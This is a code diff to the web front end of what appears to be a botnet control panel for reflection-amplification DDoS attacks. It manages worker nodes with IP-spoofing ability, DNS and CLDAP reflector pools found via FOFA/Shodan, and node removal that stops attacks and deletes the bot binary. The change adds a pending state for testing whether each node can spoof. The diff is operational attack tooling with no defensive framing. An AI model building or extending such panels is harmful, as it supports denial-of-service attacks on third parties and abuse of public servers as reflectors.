@@ -155,7 +155,7 @@
           <label style="display:flex;align-items:center;gap:3px;cursor:pointer;font-size:10px;background:var(--border);padding:2px 6px;border-radius:3px;white-space:nowrap">
             <input type="checkbox" :value="n.worker_id" x-model="selectedNodes" style="width:auto;margin:0">
             <span x-text="n.worker_id"></span>
-            <span x-show="n.can_spoof" style="color:var(--green)" x-text="'S'"></span>
+            <span x-show="n.spoof_tested && n.can_spoof" style="color:var(--green)" x-text="'S'"></span>
           </label>
         </template>
         <span x-show="nodes.length===0" style="opacity:0.5" x-text="t('no_nodes_hint')"></span>
@@ -310,8 +310,9 @@
             <td x-text="n.ip || '-'"></td>
             <td x-text="n.is_windows ? 'Windows' : 'Linux'"></td>
             <td>
-              <span x-show="n.can_spoof" style="color:var(--green);font-size:10px" x-text="t('spoof_yes')"></span>
-              <span x-show="!n.can_spoof" style="color:#f66;font-size:10px" x-text="t('spoof_no')"></span>
+              <span x-show="n.spoof_tested && n.can_spoof" style="color:var(--green);font-size:10px" x-text="t('spoof_yes')"></span>
+              <span x-show="n.spoof_tested && !n.can_spoof" style="color:#f66;font-size:10px" x-text="t('spoof_no')"></span>
+              <span x-show="!n.spoof_tested" style="color:#fa0;font-size:10px" x-text="t('spoof_pending')"></span>
             </td>
             <td x-text="(n.cpu_percent||0) + '%'"></td>
             <td x-text="(n.memory_mb||0) + ' MB'"></td>
@@ -597,7 +598,7 @@ function app() {
       add_to_pool:'Add to Pool', add_all_to_pool:'Add all to DNS pool', add_all_to_cldap:'Add all to CLDAP pool', resolvers_found:'resolvers found', reflectors_found:'reflectors found',
       fofa_tips:'FOFA / Shodan query tips', cldap_export_tip:'Export as IP:Port list, paste to CLDAP pool page for batch add & auto-verify',
       worker_nodes:'Worker Nodes', tasks:'Tasks', steam_pool:'Steam Master Pool', manual_pool:'Manual Pool',
-      col_spoof:'Spoof', spoof_yes:'YES', spoof_no:'NO', kick:'Kick',
+      col_spoof:'Spoof', spoof_yes:'YES', spoof_no:'NO', spoof_pending:'...', kick:'Kick',
       kick_confirm:'Kick node {0}? It will stop attacks, exit and delete its binary.',
       target_nodes:'Target Nodes', select_all:'All', select_none:'None', no_nodes_hint:'no nodes connected',
       force_refresh:'Force Refresh Now', test_clean:'Test All & Clean', testing:'Testing...',
@@ -647,7 +648,7 @@ function app() {
       add_to_pool:'加入池', add_all_to_pool:'全部加入DNS池', add_all_to_cldap:'全部加入CLDAP池', resolvers_found:'个解析器发现', reflectors_found:'个反射器发现',
       fofa_tips:'FOFA / Shodan 查询提示', cldap_export_tip:'导出格式选 IP:Port 列表，粘贴到 CLDAP 池页面批量添加并自动验证',
       worker_nodes:'工作节点', tasks:'任务', steam_pool:'Steam 主池', manual_pool:'手动池',
-      col_spoof:'伪造', spoof_yes:'支持', spoof_no:'不支持', kick:'踢出',
+      col_spoof:'伪造', spoof_yes:'支持', spoof_no:'不支持', spoof_pending:'检测中', kick:'踢出',
       kick_confirm:'踢出节点 {0}？它将停止攻击、退出并删除自身二进制。',
       target_nodes:'目标节点', select_all:'全选', select_none:'清空', no_nodes_hint:'无节点连接',
       force_refresh:'立即刷新', test_clean:'测试清理', testing:'测试中...',
